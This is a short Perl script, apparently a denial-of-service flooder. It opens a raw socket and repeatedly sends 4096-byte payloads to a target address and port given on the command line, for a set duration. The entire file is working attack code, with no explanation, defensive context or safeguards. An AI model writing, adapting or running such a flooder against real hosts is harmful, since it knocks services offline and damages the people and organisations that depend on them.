use Socket;
my ($target, $port, $duration) = @ARGV;
socket(SOCK, PF_INET, SOCK_RAW, 255) or die $!;
my $payload = 'A' x 4096;
my $end = time() + $duration;
while (time() < $end) {
    send(SOCK, $payload, 0, sockaddr_in($port, inet_aton($target)));
}
